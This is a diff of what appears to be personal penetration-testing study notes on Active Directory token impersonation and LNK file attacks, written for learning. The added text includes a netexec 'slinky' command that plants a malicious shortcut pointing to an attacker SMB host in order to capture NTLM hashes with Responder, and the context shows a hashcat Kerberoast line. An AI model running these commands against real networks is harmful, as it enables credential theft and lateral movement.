@@ -570,9 +570,9 @@ hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
 - 1. Strong Passwords
 - 2. Least privilege
 
-# c. Token Impersonation Attacks (README.md)
+# c. Token Impersonation Attacks
 
-## What is a token? (simple)
+## What is a token?
 A **token** is a temporary authorization object the OS issues after a successful login. It proves a user’s identity to the system so processes can access resources without re-sending passwords — think of tokens like session cookies for Windows authentication.
 
 ## Common token types
@@ -581,12 +581,12 @@ A **token** is a temporary authorization object the OS issues after a successful
 
 ---
 
-## What is a Token Impersonation attack (one line)
+## What is a Token Impersonation attack 
 An attacker who controls a process on a host can steal or impersonate a user token to perform actions as that user — often to access network resources or escalate privileges on other systems.
 
 ---
 
-## High-level attack flow (safe, conceptual)
+## High-level attack flow
 1. **Gain a shell** on a host (e.g., via a compromised account and a Meterpreter session).  
 2. **Dump or list tokens** available to the process (tokens from logged-on users, services, or active sessions).  
 3. **Duplicate / impersonate** a token for a higher-privilege user (for example, a local admin or a service account) and run commands or access network resources as that user.  
@@ -624,24 +624,45 @@ An attacker who controls a process on a host can steal or impersonate a user tok
 
    <img width="684" height="206" alt="image" src="https://github.com/user-attachments/assets/abc32356-8326-41e7-aed7-cc93b42f4fd5" />
 
-Token Impersonation mitigation strategies
-a. limit user/group token creation
-b. account tiering
-c. local admin restriction
+### Token Impersonation mitigation strategies
+- a. limit user/group token creation
+- b. account tiering
+- c. local admin restriction
 
-d. LNK File Attacks
-LNK file attacks involve the malicious use of Windows shortcut files to execute harmful commands or deliver payloads when opened by a user.
+## d. LNK File Attacks
 
-say for example we have access to a file share. we can dump a malicious file into it. 
+**summary**  
+LNK file attacks use malicious Windows shortcut (`.lnk`) files to run commands or drop payloads when a user opens the shortcut (for example, by browsing a network share). They’re a simple but effective way to capture credentials or gain code execution when users interact with shared files.
 
+---
+
+### How it works
+1. **Attacker places a malicious `.lnk` file** on a file share or other location the victim will browse.  
+2. When a user browses the share and the file is displayed or opened, the `.lnk` can cause the system to execute a command or connect to an attacker-controlled resource (for example, an SMB server).  
+3. If the victim system attempts to authenticate to that attacker-controlled SMB server (e.g., to resolve a shortcut target), the attacker can capture the NTLM authentication handshake (hash) with a tool like Responder.  
+4. The captured hash can then be cracked or relayed for lateral movement.
+
+---
+
+### Example scenario 
+- You have write access to a network file share.  
+- You create a malicious `.lnk` that references an SMB path on the attacker IP (e.g., `\\attacker-ip\share\something`) or executes a command the attacker controls.  
+- You drop the `.lnk` into the share. When a user browses the share (File Explorer often pre-fetches metadata or resolves icons/targets), the victim’s system tries to reach the attacker SMB host and sends authentication data.  
+- The attacker (running Responder or equivalent) captures the auth handshake and can use it for pass-the-hash, cracking, or relaying.
+
+---
+
+### Automating with `netexec` + `slinky` module
+```bash
+netexec smb <domain_IP> -d domain.local -u user -p Password -M slinky -o NAME=test SERVER=<attacker_IP>
+```
    <img width="640" height="145" alt="image" src="https://github.com/user-attachments/assets/9fa40aa7-7edd-41ad-a8f2-7372db5a9767" />
-if the file created gets dumped into the file share and a user visits, we can capture the user hash with responder.
 
    <img width="814" height="618" alt="image" src="https://github.com/user-attachments/assets/d6992011-ce96-449f-8b0d-24584153d2f4" />
 
    <img width="972" height="202" alt="image" src="https://github.com/user-attachments/assets/276281f8-3a6a-495a-acb7-2e83c748e3ad" />
 
-you can also automate the process of creating the malicious lnk file and dumping it into the file share using the command: netexec smb <ip_address_of_domain> -d domain.local -u user -p Password -M slinky -o NAME=test SERVER=<attacker_Ip address>
+
 
 e. GPP attacks AKA  cPassword attacks (explain that it mean)
 
